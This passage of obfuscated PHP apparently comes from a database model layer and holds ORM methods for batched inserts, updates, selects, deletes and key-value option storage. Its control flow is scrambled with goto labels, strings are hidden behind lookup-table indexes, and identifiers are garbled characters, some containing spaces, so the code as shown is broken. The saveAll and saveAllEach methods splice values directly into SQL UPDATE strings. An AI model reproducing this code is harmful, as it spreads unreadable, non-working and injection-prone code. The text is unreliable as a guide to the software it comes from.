$BÑøÊê…¾ì[345] => $F²äù÷äÇë, $BÑøÊê…¾ì[336] => $bà¨öÖ¥äñ, $BÑøÊê…¾ì[349] => $e”™·¢Î…¸), $BÑøÊê…¾ì[350] => $eˆâ†ÂÒô’ ? $eˆâ†ÂÒô’ : array()); return $Fá¬ òšîà; goto D‘øŒ²Œ¥‹; Eã°¦¸£¡¤: $this->optionsValue($D©—š­Ö»); $eˆâ†ÂÒô’ = $this->page($bà¨öÖ¥äñ, $F²äù÷äÇë)->select(); $eˆâ†ÂÒô’ = is_array($eˆâ†ÂÒô’) ? $eˆâ†ÂÒô’ : array(); goto a÷´íÃ”ç; D‘øŒ²Œ¥‹: } protected function checkLength($BÎÁœßÜĞÉ, $Dª—îÒæœ¡ = 0, $a»£ÎğÑá™ = '') { $AÇÎò¬‡îØ =& $_SERVER[Ìó]; $Dª—îÒæœ¡ = $Dª—îÒæœ¡ ? $Dª—îÒæœ¡ : 65536; if (!$BÎÁœßÜĞÉ || strlen($BÎÁœßÜĞÉ) < $Dª—îÒæœ¡) { return; } $a»£ÎğÑá™ = $a»£ÎğÑá™ ? $a»£ÎğÑá™ . $AÇÎò¬‡îØ[67] : $AÇÎò¬‡îØ[33]; show_json($a»£ÎğÑá™ . LNG($AÇÎò¬‡îØ[351]) . "\50{$Dª—îÒæœ¡}\51", !1); } protected function metaSet($D§øãºÔµ, $Aá–±•µ§‰ = null, $bù”ÜÎî²‘ = null) { goto cÁ¿†˜¾º¡; BÕ¯Ô…¬¹Ü: if (is_string($Aá–±•µ§‰)) { $E†·×Ì©´…[$Aá–±•µ§‰] = $bù”ÜÎî²‘; } $F»Çµ³Í¤î = array(); foreach ($E†·×Ì©´… as $EÃô†ìĞ®„ => $bË‚îÅÑÓ¸) { $this->checkLength($bË‚îÅÑÓ¸, !1, $Eìù§èØ¤² . $DáÕêÌÆš×[4] . $EÃô†ìĞ®„); $F»Çµ³Í¤î[] = array($D»Û–ïÌßñ => $D§øãºÔµ, $DáÕêÌÆš×[89] => $EÃô†ìĞ®„, $DáÕêÌÆš×[355] => $bË‚îÅÑÓ¸); } goto AÇÊ‰‘ŸÖ; cÁ¿†˜¾º¡: $DáÕêÌÆš× =& $_SERVER[Ìó]; if (!$this->tableMeta) { return !1; } $D»Û–ïÌßñ = $this->tableMeta[$DáÕêÌÆš×[352]]; goto fà‚ÚàÕëó; eˆ™ğŒÛé : if (is_null($Aá–±•µ§‰)) { return $F„¨ÀÏÆë¯->where(array($D»Û–ïÌßñ => $D§øãºÔµ))->delete(); } if (is_null($bù”ÜÎî²‘)) { return $F„¨ÀÏÆë¯->where($dóƒ²†ÎØ)->delete(); } $E†·×Ì©´… = is_array($Aá–±•µ§‰) ? $Aá–±•µ§‰ : array(); goto BÕ¯Ô…¬¹Ü; fà‚ÚàÕëó: $Eìù§èØ¤² = $this->tableMeta[$DáÕêÌÆš×[353]]; $F„¨ÀÏÆë¯ = Model($Eìù§èØ¤²); $dóƒ²†ÎØ = array($D»Û–ïÌßñ => $D§øãºÔµ, $DáÕêÌÆš×[354] => $Aá–±•µ§‰); goto eˆ™ğŒÛé ; AÇÊ‰‘ŸÖ: $F„¨ÀÏÆë¯->where(array($D»Û–ïÌßñ => $D§øãºÔµ))->addAll($F»Çµ³Í¤î, array(), !0); return !0; goto fƒØö¤²–; fƒØö¤²–: } public function metaGet($AœÈ›Ó‚·Í) { goto e¡‰óÉ›ã­; aíÔ¹½Íö: $cÊ“…›Ù†× = array_to_keyvalue($cÊ“…›Ù†×, $AÑŠ¿‘ß°‰[89], $AÑŠ¿‘ß°‰[355]); return $cÊ“…›Ù†×; goto a÷‡•‡Ÿâ; F‡µ…ôè¢‚: $d£¦ÜÙ­³œ = Model($this->tableMeta[$AÑŠ¿‘ß°‰[353]]); $A¯ë¯ğÈÖ = array($dŞ™©‹¤ğÕ => $AœÈ›Ó‚·Í); $cÊ“…›Ù†× = $d£¦ÜÙ­³œ->field($AÑŠ¿‘ß°‰[356])->where($A¯ë¯ğÈÖ)->select(); goto aíÔ¹½Íö; e¡‰óÉ›ã­: $AÑŠ¿‘ß°‰ =& $_SERVER[Ìó]; if (!$this->tableMeta) { return array(); } $dŞ™©‹¤ğÕ = $this->tableMeta[$AÑŠ¿‘ß°‰[352]]; goto F‡µ…ôè¢‚; a÷‡•‡Ÿâ: } private function checkDataAutoHas($fª¶á·ÚÙª) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $DÌ¦ªŠóÃ£) { if (in_array($fª¶á·ÚÙª, explode($_SERVER[Ìó][47], $DÌ¦ªŠóÃ£[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$D…›ï‡õ , $bÑ‹Â ¹) { $fä´©ÚÍ©¿ =& $_SERVER[Ìó]; foreach ($this->dataAuto as $FŠ¤¿ã‘) { $EïÀ¤ÅÆË‹ = $FŠ¤¿ã‘[0]; if (!in_array($bÑ‹Â ¹, explode($fä´©ÚÍ©¿[47], $FŠ¤¿ã‘[2]))) { continue; } switch (trim($FŠ¤¿ã‘[3])) { case $fä´©ÚÍ©¿[305]: case $fä´©ÚÍ©¿[306]: $EˆÉäÚàë˜ = $FŠ¤¿ã‘[1]; $b—Éˆéµ• = isset($FŠ¤¿ã‘[4]) ? (array) $FŠ¤¿ã‘[4] : array(); if ($EˆÉäÚàë˜ == $fä´©ÚÍ©¿[186] && array_key_exists($EïÀ¤ÅÆË‹, $D…›ï‡õ )) { if (!$D…›ï‡õ [$EïÀ¤ÅÆË‹]) { unset($D…›ï‡õ [$EïÀ¤ÅÆË‹]); } break; } if (isset($D…›ï‡õ [$EïÀ¤ÅÆË‹])) { array_unshift($b—Éˆéµ•, $D…›ï‡õ [$EïÀ¤ÅÆË‹]); } if ($fä´©ÚÍ©¿[305] == $FŠ¤¿ã‘[3]) { $D…›ï‡õ [$EïÀ¤ÅÆË‹] = call_user_func_array($EˆÉäÚàë˜, $b—Éˆéµ•); } else { $D…›ï‡õ [$EïÀ¤ÅÆË‹] = call_user_func_array(array(&$this, $EˆÉäÚàë˜), $b—Éˆéµ•); } break; case $fä´©ÚÍ©¿[257]: $D…›ï‡õ [$EïÀ¤ÅÆË‹] = $D…›ï‡õ [$FŠ¤¿ã‘[1]]; break; case $fä´©ÚÍ©¿[278]: if (isset($D…›ï‡õ [$EïÀ¤ÅÆË‹]) && !is_string($D…›ï‡õ [$EïÀ¤ÅÆË‹])) { $D…›ï‡õ [$EïÀ¤ÅÆË‹] = json_encode_force($D…›ï‡õ [$EïÀ¤ÅÆË‹]); } break; case $fä´©ÚÍ©¿[307]: if ($D…›ï‡õ [$EïÀ¤ÅÆË‹] === $fä´©ÚÍ©¿[33]) { unset($D…›ï‡õ [$EïÀ¤ÅÆË‹]); } break; case $fä´©ÚÍ©¿[308]: $D…›ï‡õ [$EïÀ¤ÅÆË‹] = $FŠ¤¿ã‘[1]; default: break; } } if ($bÑ‹Â ¹ == $fä´©ÚÍ©¿[340]) { $aë„Ôø‹ = strtolower($this->db->getDbType()); if (strpos($aë„Ôø‹, $fä´©ÚÍ©¿[9]) !== 0) { return; } $FÖ‘ÜâÀ·± = $this->field(!0)->fields; $eÇØ§ªÓ†ì = $FÖ‘ÜâÀ·±[$fä´©ÚÍ©¿[236]]; if (isset($FÖ‘ÜâÀ·±[$fä´©ÚÍ©¿[235]])) { unset($eÇØ§ªÓ†ì[$FÖ‘ÜâÀ·±[$fä´©ÚÍ©¿[235]]]); } foreach ($eÇØ§ªÓ†ì as $CöŒÎİÓ–¹ => $bÑ‹Â ¹) { if (!isset($D…›ï‡õ [$CöŒÎİÓ–¹])) { $D…›ï‡õ [$CöŒÎİÓ–¹] = $fä´©ÚÍ©¿[33]; } } } } private function dataAfterFilter(&$D‚õÌÈ†¡÷) { $bÊÊºéõï =& $_SERVER[Ìó]; foreach ($this->dataAuto as $F±Æ¬Çñ—È) { $B“ƒŒç´ = $F±Æ¬Çñ—È[0]; if (!in_array($bÊÊºéõï[342], explode($bÊÊºéõï[47], $F±Æ¬Çñ—È[2]))) { continue; } if (!isset($D‚õÌÈ†¡÷[$B“ƒŒç´])) { continue; } switch (trim($F±Æ¬Çñ—È[3])) { case $bÊÊºéõï[305]: case $bÊÊºéõï[306]: $EÒŒµÙÅå = isset($F±Æ¬Çñ—È[4]) ? (array) $F±Æ¬Çñ—È[4] : array(); array_unshift($EÒŒµÙÅå, $D‚õÌÈ†¡÷[$B“ƒŒç´]); if ($bÊÊºéõï[305] == $F±Æ¬Çñ—È[3]) { $D‚õÌÈ†¡÷[$B“ƒŒç´] = call_user_func_array($F±Æ¬Çñ—È[1], $EÒŒµÙÅå); } else { $D‚õÌÈ†¡÷[$B“ƒŒç´] = call_user_func_array(array(&$this, $F±Æ¬Çñ—È[1]), $EÒŒµÙÅå); } break; case $bÊÊºéõï[257]: $D‚õÌÈ†¡÷[$B“ƒŒç´] = $D‚õÌÈ†¡÷[$F±Æ¬Çñ—È[1]]; break; case $bÊÊºéõï[278]: $b¾áè’®ŠŞ = $D‚õÌÈ†¡÷[$B“ƒŒç´]; $D‚õÌÈ†¡÷[$B“ƒŒç´] = json_decode($b¾áè’®ŠŞ, !0); if (is_null($D‚õÌÈ†¡÷[$B“ƒŒç´])) { $D‚õÌÈ†¡÷[$B“ƒŒç´] = $b¾áè’®ŠŞ; } break; case $bÊÊºéõï[307]: if ($D‚õÌÈ†¡÷[$B“ƒŒç´] === $bÊÊºéõï[33]) { unset($D‚õÌÈ†¡÷[$B“ƒŒç´]); } break; case $bÊÊºéõï[308]: $D‚õÌÈ†¡÷[$B“ƒŒç´] = $F±Æ¬Çñ—È[1]; default: break; } } } public function saveAll($eÜß´‚“‡—) { goto fÑìõÏ ÏÊ; fÑìõÏ ÏÊ: $Bíí¾‡¸ÂÓ =& $_SERVER[Ìó]; $B’ã‚ÍîĞç = $this->tablePrefix . $this->tableName; $dÄ…Äª†ù¡ = self::SQL_WHERE_IN_CHUNK; goto C·ÇÑÅñàì; C·ÇÑÅñàì: $eÜß´‚“‡— = is_array($eÜß´‚“‡—) ? $eÜß´‚“‡— : array(); $EöŠÂˆÁêç = $Bíí¾‡¸ÂÓ[357]; $b½–¸º²à† = 0; goto fôëê°ÒÊì; fÂí¬‡“Ş: $this->chunkEventSet(); goto A·´¯÷¶Âå; fôëê°ÒÊì: $c˜À“ÈÑâ³ = array(); $B²ÌËğ¿Ó° = count($eÜß´‚“‡—); for ($C©ÓáÜó·° = 0; $C©ÓáÜó·° < $B²ÌËğ¿Ó°; $C©ÓáÜó·°++) { $dœŠ¨ØˆÌ = $eÜß´‚“‡—[$C©ÓáÜó·°]; if (!is_array($dœŠ¨ØˆÌ) || count($dœŠ¨ØˆÌ) != 4) { continue; } $aŸ‘‰Ûœõê = "\x55\120\104\101\124\x45\40{$B’ã‚ÍîĞç}\40\x53\x45\124\40{$dœŠ¨ØˆÌ[2]}\40\x3d\x20\x43\101\x53\105\x20{$dœŠ¨ØˆÌ[0]}\40\12"; if ($b½–¸º²à† == 0) { $EöŠÂˆÁêç = $aŸ‘‰Ûœõê; } $c˜À“ÈÑâ³[] = $Bíí¾‡¸ÂÓ[112] . $dœŠ¨ØˆÌ[1] . $Bíí¾‡¸ÂÓ[112]; $b½–¸º²à†++; $EöŠÂˆÁêç .= "\40\x57\x48\x45\116\x20\x27{$dœŠ¨ØˆÌ[1]}\47\40\124\110\x45\116\x20\x27{$dœŠ¨ØˆÌ[3]}\x27\x20\12"; if ($b½–¸º²à† == $dÄ…Äª†ù¡ || $C©ÓáÜó·° == $B²ÌËğ¿Ó° - 1) { goto b³Øõ‚›ˆÕ; FÏêè¼æç¹: $b½–¸º²à† = 0; $EöŠÂˆÁêç = $aŸ‘‰Ûœõê; $this->chunkEventCheck(count($c˜À“ÈÑâ³)); goto eà¢†Ââîø; b³Øõ‚›ˆÕ: $b¹áÜ©ê = implode($Bíí¾‡¸ÂÓ[47], $c˜À“ÈÑâ³); $EöŠÂˆÁêç .= "\x20\105\116\104\40\x20\x57\x48\x45\x52\105\40{$dœŠ¨ØˆÌ[0]}\40\x49\116\x20\50{$b¹áÜ©ê}\51\x20"; $this->execute($EöŠÂˆÁêç); goto FÏêè¼æç¹; eà¢†Ââîø: $c˜À“ÈÑâ³ = array(); goto d‡’…ˆ°áŞ; d‡’…ˆ°áŞ: } } goto fÂí¬‡“Ş; A·´¯÷¶Âå: } public function saveAllEach($bœø¦¡ÔÉù) { $e²·‡ˆÊÌ =& $_SERVER[Ìó]; $b‘ìçÀÏˆ = $this->tablePrefix . $this->tableName; foreach ($bœø¦¡ÔÉù as $d¯ìÓ·¥ÄÜ) { if (!is_array($d¯ìÓ·¥ÄÜ) || count($d¯ìÓ·¥ÄÜ) != 4) { continue; } $b©ñ›Œó× = $d¯ìÓ·¥ÄÜ[0] . $e²·‡ˆÊÌ[358] . $d¯ìÓ·¥ÄÜ[1] . $e²·‡ˆÊÌ[112]; $DŒ‡®ª¬Òó = $d¯ìÓ·¥ÄÜ[2] . $e²·‡ˆÊÌ[358] . $d¯ìÓ·¥ÄÜ[3] . $e²·‡ˆÊÌ[112]; $eßÊÖ  = "\x75\160\144\141\164\x65\40{$b‘ìçÀÏˆ}\x20\163\x65\x74\x20{$DŒ‡®ª¬Òó}\x20\x77\150\x65\162\x65\40{$b©ñ›Œó×}\73"; $this->execute($eßÊÖ ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Aßá¿ÎéšÅ = false, $b™çï÷¦÷â = false) { $this->_chunkEvent = $Aßá¿ÎéšÅ; $this->_chunkEventParam = $b™çï÷¦÷â; } private function chunkEventCheck($cÆ¢¨õŒ¶õ) { if (!$this->_chunkEvent) { return; } $bˆ‚–¥­Œ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $bˆ‚–¥­Œ[$_SERVER[Ìó][359]] = $cÆ¢¨õŒ¶õ; Hook::trigger($this->_chunkEvent, $bˆ‚–¥­Œ); } public function addAll($C ƒìŞƒ, $F˜†ĞÈ¶àö = array(), $aºÓ­ŒöÂ„ = false) { goto aØ›ÒÆÚÎ; Aó×ÅîìŞ¨: if (method_exists($this->db, $D½¥‚èÓ­„[256])) { for ($b‡Ñ¾Š‚ÔŞ = 0; $b‡Ñ¾Š‚ÔŞ < count($C ƒìŞƒ); $b‡Ñ¾Š‚ÔŞ += $eÛ‚‚§Âğª) { $ašïíë‘Ş£ = array_slice($C ƒìŞƒ, $b‡Ñ¾Š‚ÔŞ, $eÛ‚‚§Âğª); if (!is_array($ašïíë‘Ş£) || count($ašïíë‘Ş£) == 0) { break; } $A¨ôĞšßõå = $this->db->insertAll($ašïíë‘Ş£, $F˜†ĞÈ¶àö, $aºÓ­ŒöÂ„); $this->chunkEventCheck(count($ašïíë‘Ş£)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($C ƒìŞƒ as $E‘Áë‚õ×‡ => $FÕíÜ¨›ª‰) { $A¨ôĞšßõå = $this->db->insert($FÕíÜ¨›ª‰, $F˜†ĞÈ¶àö, $aºÓ­ŒöÂ„); } $this->commit(); } if (!1 !== $A¨ôĞšßõå) { $FŠ ²åÈÓ = $this->getLastInsID(); if ($FŠ ²åÈÓ) { return $FŠ ²åÈÓ; } } return $A¨ôĞšßõå; goto FÉÜö‚È¸‰; aØ›ÒÆÚÎ: $D½¥‚èÓ­„ =& $_SERVER[Ìó]; ignore_timeout(); $eÛ‚‚§Âğª = self::SQL_WHERE_IN_CHUNK; goto aøÒØç¹¿¥; aøÒØç¹¿¥: if (empty($C ƒìŞƒ)) { $this->error = think_lang($D½¥‚èÓ­„[255]); return !1; } $F˜†ĞÈ¶àö = $this->_parseOptions($F˜†ĞÈ¶àö); foreach ($C ƒìŞƒ as $E‘Áë‚õ×‡ => $FÕíÜ¨›ª‰) { $C ƒìŞƒ[$E‘Áë‚õ×‡] = $this->_facade($FÕíÜ¨›ª‰); $this->_beforeInsert($C ƒìŞƒ[$E‘Áë‚õ×‡], $F˜†ĞÈ¶àö); } goto Aó×ÅîìŞ¨; FÉÜö‚È¸‰: } public function save($DÄš™êï§‰ = '', $Dğ«ˆÍŞæ = array()) { goto F˜æÛóÑ‚ó; eğòù‡¯¸µ: $eŞ«ù‡ÌÕ = $Dµß¿áƒß¶[$a‰‹°ˆí˜°[259]][$E³£´ƒÁ´Î][1]; $eŞ«ù‡ÌÕ = is_array($eŞ«ù‡ÌÕ) ? $eŞ«ù‡ÌÕ : array(); $EÅŒô½¢è´ = count($eŞ«ù‡ÌÕ); goto bù·˜²ÃÏ; EÈõäÃ¬ù’: $E³£´ƒÁ´Î = $this->findWhereField($Dµß¿áƒß¶); if (!$E³£´ƒÁ´Î) { return parent::save($DÄš™êï§‰, $Dğ«ˆÍŞæ); } $aâƒ‰ÔÄóò = 0; goto eğòù‡¯¸µ; F˜æÛóÑ‚ó: $a‰‹°ˆí˜° =& $_SERVER[Ìó]; $eì°Ÿ¬ô« = self::SQL_WHERE_IN_CHUNK; $Dµß¿áƒß¶ = $this->optionsValue(); goto EÈõäÃ¬ù’; bù·˜²ÃÏ: for ($F´“İ¾°Ÿ¯ = 0; $F´“İ¾°Ÿ¯ < $EÅŒô½¢è´; $F´“İ¾°Ÿ¯ += $eì°Ÿ¬ô«) { $b»ùèÅá¢õ = array_slice($eŞ«ù‡ÌÕ, $F´“İ¾°Ÿ¯, $eì°Ÿ¬ô«); if (!is_array($b»ùèÅá¢õ) || count($b»ùèÅá¢õ) == 0) { break; } $Dµß¿áƒß¶[$a‰‹°ˆí˜°[259]][$E³£´ƒÁ´Î][1] = $b»ùèÅá¢õ; $this->optionsValue($Dµß¿áƒß¶); $aâƒ‰ÔÄóò += parent::save($DÄš™êï§‰, $Dğ«ˆÍŞæ); $this->chunkEventCheck(count($b»ùèÅá¢õ)); } $this->chunkEventSet(); return $aâƒ‰ÔÄóò; goto fŠËîÙ¯ê·; fŠËîÙ¯ê·: } public function add($AÈÈÜÇÚ÷¯ = '', $Dñ°¦Â¨ì³ = array(), $e«Ç†ùÍ°¢ = false) { if ($this->addTaskStatus && is_array($AÈÈÜÇÚ÷¯)) { $this->addTaskData[] = $AÈÈÜÇÚ÷¯; return; } return parent::add($AÈÈÜÇÚ÷¯, $Dñ°¦Â¨ì³, $e«Ç†ùÍ°¢); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($BÏêš•Ú× = array()) { goto FƒÂ‡Âªø‚; BÔ…”­Ñ™õ: $BÁ„í´¡‚ = $this->findWhereField($cïÜ²„±ÃÒ); if (!$BÁ„í´¡‚ || isset($cïÜ²„±ÃÒ[$Bù¯ˆ[276]]) || isset($cïÜ²„±ÃÒ[$Bù¯ˆ[336]])) { return parent::select($BÏêš•Ú×); } $B÷ÅË¿°ßÈ = $cïÜ²„±ÃÒ[$Bù¯ˆ[259]][$BÁ„í´¡‚][1]; goto F‰ù¡¼ëÙƒ; Aù“Øì×Œö: return $aĞÔ¦Ãœî’; goto CŞªñÆª¸Ä; F‰ù¡¼ëÙƒ: $B÷ÅË¿°ßÈ = is_array($B÷ÅË¿°ßÈ) ? $B÷ÅË¿°ßÈ : array(); $aĞÔ¦Ãœî’ = null; for ($AÈ¸Ù’ã¿¡ = 0; $AÈ¸Ù’ã¿¡ < count($B÷ÅË¿°ßÈ); $AÈ¸Ù’ã¿¡ += $CëÒ¶æ¸³) { $DçŒÌÂÂ®´ = array_slice($B÷ÅË¿°ßÈ, $AÈ¸Ù’ã¿¡, $CëÒ¶æ¸³); if (!is_array($DçŒÌÂÂ®´) || count($DçŒÌÂÂ®´) == 0) { break; } $cïÜ²„±ÃÒ[$Bù¯ˆ[259]][$BÁ„í´¡‚][1] = $DçŒÌÂÂ®´; $this->optionsValue($cïÜ²„±ÃÒ); $AÅÖÇ„ğŒ = parent::select($BÏêš•Ú×); if (!$AÅÖÇ„ğŒ) { continue; } if (is_null($aĞÔ¦Ãœî’)) { $aĞÔ¦Ãœî’ = array(); } $aĞÔ¦Ãœî’ = array_merge($aĞÔ¦Ãœî’, $AÅÖÇ„ğŒ); } goto Aù“Øì×Œö; FƒÂ‡Âªø‚: $Bù¯ˆ =& $_SERVER[Ìó]; $CëÒ¶æ¸³ = self::SQL_WHERE_IN_CHUNK; $cïÜ²„±ÃÒ = $this->optionsValue(); goto BÔ…”­Ñ™õ; CŞªñÆª¸Ä: } public function delete($B¼å—í ªœ = array()) { goto bƒªé™ôœÍ; AÂ©•ùí: return $Dä¡ø¸† ; goto F·ßùÎğ„ù; D·ÅŞ ÜÑŒ: $BòÈ¬—¤è¦ = $Eîïèã¢—[$A›œÀ‹´è[259]][$e¼˜ªçì¶Ü][1]; $BòÈ¬—¤è¦ = is_array($BòÈ¬—¤è¦) ? $BòÈ¬—¤è¦ : array(); for ($aöòè§”äƒ = 0; $aöòè§”äƒ < count($BòÈ¬—¤è¦); $aöòè§”äƒ += $fšŒ²ÚÅùï) { $B–“Òœƒìç = array_slice($BòÈ¬—¤è¦, $aöòè§”äƒ, $fšŒ²ÚÅùï); if (!is_array($B–“Òœƒìç) || count($B–“Òœƒìç) == 0) { break; } $Eîïèã¢—[$A›œÀ‹´è[259]][$e¼˜ªçì¶Ü][1] = $B–“Òœƒìç; $this->optionsValue($Eîïèã¢—); $Dä¡ø¸†  += parent::delete($B¼å—í ªœ); } goto AÂ©•ùí; bƒªé™ôœÍ: $A›œÀ‹´è =& $_SERVER[Ìó]; $fšŒ²ÚÅùï = self::SQL_WHERE_IN_CHUNK; $Eîïèã¢— = $this->optionsValue(); goto F²Ğâ½Áµ¼; F²Ğâ½Áµ¼: $e¼˜ªçì¶Ü = $this->findWhereField($Eîïèã¢—); if (!$e¼˜ªçì¶Ü) { return parent::delete($B¼å—í ªœ); } $Dä¡ø¸†  = 0; goto D·ÅŞ ÜÑŒ; F·ßùÎğ„ù: } private function findWhereField($dæ©Úº‚Š†) { $a‡Üõ‹¢ëÌ =& $_SERVER[Ìó]; $e‹­¼‚í‚ñ = self::SQL_WHERE_IN_CHUNK; if (!is_array($dæ©Úº‚Š†) || !is_array($dæ©Úº‚Š†[$a‡Üõ‹¢ëÌ[259]])) { return !1; } foreach ($dæ©Úº‚Š†[$a‡Üõ‹¢ëÌ[259]] as $A§‚©Ò‹ => $CõÆ¦åô§ê) { if (is_array($CõÆ¦åô§ê) && isset($CõÆ¦åô§ê[0]) && is_string($CõÆ¦åô§ê[0]) && strtolower($CõÆ¦åô§ê[0]) == $a‡Üõ‹¢ëÌ[7] && is_array($CõÆ¦åô§ê[1]) && count($CõÆ¦åô§ê[1]) > $e‹­¼‚í‚ñ) { ignore_timeout(); return $A§‚©Ò‹; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\x74\x65\x6d\117\x70\x74\151\157\156"; public $field = array(); public function listData($A»¨¨ğçùï = false, $EíÍõ¸¡ = "\x6d\x6f\x64\151\146\171\124\x69\155\x65", $dÂó¥Øí©Ñ = false) { $cïÄŸÒ–Óì = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$cïÄŸÒ–Óì) { return $A»¨¨ğçùï ? null : array(); } if (!$A»¨¨ğçùï) { $cïÄŸÒ–Óì = array_filter(array_values($cïÄŸÒ–Óì)); return array_sort_by($cïÄŸÒ–Óì, $EíÍõ¸¡, $dÂó¥Øí©Ñ); } return $cïÄŸÒ–Óì[$_SERVER[Ìó][360] . $A»¨¨ğçùï]; } public function insert($AŒ‹ÎŠçÆ) { goto aßÄÏÙËî; aßÄÏÙËî: $dâù÷‘‹îé =& $_SERVER[Ìó]; $AŒ‹ÎŠçÆ = array_field_key($AŒ‹ÎŠçÆ, $this->field); $a÷µÄ©œšË = Model($this->modelType)->get($dâù÷‘‹îé[361], $this->optionType . $dâù÷‘‹îé[362]); goto aÄë›İÂ¥¤; A¾ƒØ®Ñ˜: $AŒ‹ÎŠçÆ[$dâù÷‘‹îé[106]] = time(); Model($this->modelType)->set($dâù÷‘‹îé[361], $a÷µÄ©œšË, $this->optionType . $dâù÷‘‹îé[362]); Model($this->modelType)->set($dâù÷‘‹îé[360] . $a÷µÄ©œšË, $AŒ‹ÎŠçÆ, $this->optionType); goto C…‚ÍĞÓò; C…‚ÍĞÓò: return $a÷µÄ©œšË; goto CÚåÂ­½ø; aÄë›İÂ¥¤: $a÷µÄ©œšË = $a÷µÄ©œšË ? $a÷µÄ©œšË : 0; $AŒ‹ÎŠçÆ[$dâù÷‘‹îé[363]] = ++$a÷µÄ©œšË; $AŒ‹ÎŠçÆ[$dâù÷‘‹îé[183]] = time(); goto A¾ƒØ®Ñ˜; CÚåÂ­½ø: } public function update($C““å¢İá, $eø¤£ÉùÒÏ) { goto d¨¿òÆ¹Šœ; DéŒÛŠ‘ä¹: if (!$fÆ³ùåĞ§š) { return !1; } $eø¤£ÉùÒÏ = array_merge($fÆ³ùåĞ§š, $eø¤£ÉùÒÏ); $eø¤£ÉùÒÏ[$a‡¿ÊÒ†·Ú[106]] = time(); goto Fšæò¦’…‰; Fšæò¦’…‰: return Model($this->modelType)->set($a‡¿ÊÒ†·Ú[360] . $C““å¢İá, $eø¤£ÉùÒÏ, $this->optionType); goto Dçò°«éã†; d¨¿òÆ¹Šœ: $a‡¿ÊÒ†·Ú =& $_SERVER[Ìó]; $eø¤£ÉùÒÏ = array_field_key($eø¤£ÉùÒÏ, $this->field); $fÆ³ùåĞ§š = $this->listData($C““å¢İá); goto DéŒÛŠ‘ä¹; Dçò°«éã†: } public function remove($EÊô››ë¨ƒ) { return Model($this->modelType)->remove($_SERVER[Ìó][360] . $EÊô››ë¨ƒ, $this->optionType); } public function clear() { $b‚Ëîİ˜º³ =& $_SERVER[Ìó]; Model($this->modelType)->remove($b‚Ëîİ˜º³[361], $this->optionType . $b‚Ëîİ˜º³[362]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($A†¥¿ÑîÇØ, $Có§ÆİĞ™Â) { if (!$Có§ÆİĞ™Â) { return !1; } $EÅ¡±…‡Í¿ = $this->listData(); $EÅ¡±…‡Í¿ = array_to_keyvalue($EÅ¡±…‡Í¿, $A†¥¿ÑîÇØ); return isset($EÅ¡±…‡Í¿[$Có§ÆİĞ™Â]) ? $EÅ¡±…‡Í¿[$Có§ÆİĞ™Â] : !1; } public function findByName($fÌÎº•É‹“) { return $this->findByKey($_SERVER[Ìó][28], $fÌÎº•É‹“); } protected function resetData($E„‘¼èÂ) { $aÎµ¤áõ×Ø =& $_SERVER[Ìó]; $E„‘¼èÂ = is_array($E„‘¼èÂ) ? $E„‘¼èÂ : array(); $e¯¢İÓ‡œÔ = array(); for ($Dø–›ÜµÎ˜ = 0; $Dø–›ÜµÎ˜ < count($E„‘¼èÂ); $Dø–›ÜµÎ˜++) { $e¯¢İÓ‡œÔ[$aÎµ¤áõ×Ø[360] . $E„‘¼èÂ[$Dø–›ÜµÎ˜][$aÎµ¤áõ×Ø[363]]] = $E„‘¼èÂ[$Dø–›ÜµÎ˜]; } return Model($this->modelType)->set($e¯¢İÓ‡œÔ, !1, $this->optionType); } private function getAutoName($c¯µŠ¢ãß³) { $bòèµô‘¨¦ = array_to_keyvalue($this->listData(), $_SERVER[Ìó][28]); if (!$bòèµô‘¨¦ || !isset($bòèµô‘¨¦[$c¯µŠ¢ãß³])) { return $c¯µŠ¢ãß³; } for ($cìÎÈ²ëô­ = 1; $cìÎÈ²ëô­ < count($bòèµô‘¨¦); $cìÎÈ²ëô­++) { $Bæ —–ÛÂÁ = $c¯µŠ¢ãß³ . "\50{$cìÎÈ²ëô­}\51"; if (!isset($bòèµô‘¨¦[$Bæ —–ÛÂÁ])) { return $Bæ —–ÛÂÁ; } } return $Bæ —–ÛÂÁ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($b‰ÈÈµªã¾ = false, $eê»¾½«ª¦ = '', $C‰‹¡Â¤Şå = false) { goto fÆá¤¯×; fÆá¤¯×: $cŒ ù¥ë¨´ =& $_SERVER[Ìó]; $Bõò¡àÅª¯ = $this->cacheGet($eê»¾½«ª¦); $aßÚ©Ğ”Â´ = $this->optionDefault($eê»¾½«ª¦); goto B¶µâ¦œõŞ; B¶µâ¦œõŞ: $aßÚ©Ğ”Â´ = is_array($aßÚ©Ğ”Â´) ? $aßÚ©Ğ”Â´ : array(); if (is_array($Bõò¡àÅª¯)) { $Bõò¡àÅª¯ = array_merge($aßÚ©Ğ”Â´, $Bõò¡àÅª¯); return $b‰ÈÈµªã¾ ? isset($Bõò¡àÅª¯[$b‰ÈÈµªã¾]) ? $Bõò¡àÅª¯[$b‰ÈÈµªã¾] : null : $Bõò¡àÅª¯; } $a§ˆğ£ÖĞ = $this->filterWhere(array($cŒ ù¥ë¨´[29] => $eê»¾½«ª¦)); goto aŠ×Àµñ†ö; aŠ×Àµñ†ö: $Bõò¡àÅª¯ = $this->where($a§ˆğ£ÖĞ)->select(); $Bõò¡àÅª¯ = array_to_keyvalue($Bõò¡àÅª¯, $cŒ ù¥ë¨´[89], $cŒ ù¥ë¨´[355]); foreach ($Bõò¡àÅª¯ as $B„§îš‰ÅÂ => $Cá¦â†ƒ) { if ($C‰‹¡Â¤Şå || in_array($B„§îš‰ÅÂ, $this->jsonField)) { $Bõò¡àÅª¯[$B„§îš‰ÅÂ] = json_decode($Cá¦â†ƒ, !0); } } goto e™°ƒÈæÒ; e™°ƒÈæÒ: 